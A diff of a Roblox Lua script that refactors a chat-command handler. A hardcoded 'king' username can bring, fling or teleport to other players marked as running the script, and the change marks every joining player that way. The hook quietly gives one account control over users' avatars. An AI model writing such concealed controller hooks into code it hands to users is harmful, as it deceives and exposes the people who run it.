@@ -163,7 +163,7 @@ Players.PlayerAdded:Connect(function(player)
     assignTitle(player)
 end)
 
----- Configuration
+-- Configuration
 local KING_USERNAME = "awdasdawfa8" -- only the king can run commands
 
 -- Services
@@ -172,14 +172,16 @@ local LocalPlayer = Players.LocalPlayer
 
 -- Track who has the script
 local playersUsingScript = {}
+
+-- Mark the local player as using the script
 playersUsingScript[LocalPlayer.UserId] = true
 
--- Helper
+-- Helper to get HumanoidRootPart
 local function getRoot(char)
     return char and char:FindFirstChild("HumanoidRootPart")
 end
 
--- Find player by username/display name or partial
+-- Find player by username/display name or partial match
 local function findPlayerByName(partial)
     partial = partial:lower()
     for _, plr in pairs(Players:GetPlayers()) do
@@ -194,7 +196,7 @@ local function findPlayerByName(partial)
     end
 end
 
--- Actions
+-- Actions for commands
 local function bring(plr, target)
     if getRoot(plr.Character) and getRoot(target.Character) then
         getRoot(target.Character).CFrame = getRoot(plr.Character).CFrame + Vector3.new(2, 0, 0)
@@ -222,9 +224,14 @@ local function gotoTarget(plr, target)
     end
 end
 
--- Hook command listener
-local function hookPlayer(plr)
+-- Mark other players as using the script when they join
+local function onPlayerAdded(plr)
+    -- Mark player as using the script if they are running it
+    playersUsingScript[plr.UserId] = true
+
+    -- Hook into the player's chat for commands
     plr.Chatted:Connect(function(msg)
+        -- Only King can issue commands
         if plr.Name ~= KING_USERNAME then return end
 
         local cmd, arg = msg:match("^(%S+)%s*(.*)$")
@@ -240,7 +247,7 @@ local function hookPlayer(plr)
                 end
             else
                 local target = findPlayerByName(arg)
-                if target and playersUsingScript[target.UserId] then
+                if target and playersUsingScript[target.UserId] and target.Name ~= KING_USERNAME then
                     bring(plr, target)
                 end
             end
@@ -253,27 +260,26 @@ local function hookPlayer(plr)
                 end
             else
                 local target = findPlayerByName(arg)
-                if target and playersUsingScript[target.UserId] then
+                if target and playersUsingScript[target.UserId] and target.Name ~= KING_USERNAME then
                     fling(target)
                 end
             end
         elseif cmd == "$goto" then
             local target = findPlayerByName(arg)
-            if target and playersUsingScript[target.UserId] then
+            if target and playersUsingScript[target.UserId] and target.Name ~= KING_USERNAME then
                 gotoTarget(plr, target)
             end
         end
     end)
 end
 
--- Initial + new player hook
-for _, plr in pairs(Players:GetPlayers()) do
-    hookPlayer(plr)
-end
-Players.PlayerAdded:Connect(function(plr)
-    hookPlayer(plr)
-end)
+-- Hook player added event to track all players
+Players.PlayerAdded:Connect(onPlayerAdded)
 
+-- Initial players setup
+for _, plr in pairs(Players:GetPlayers()) do
+    onPlayerAdded(plr)
+end
 
 
 
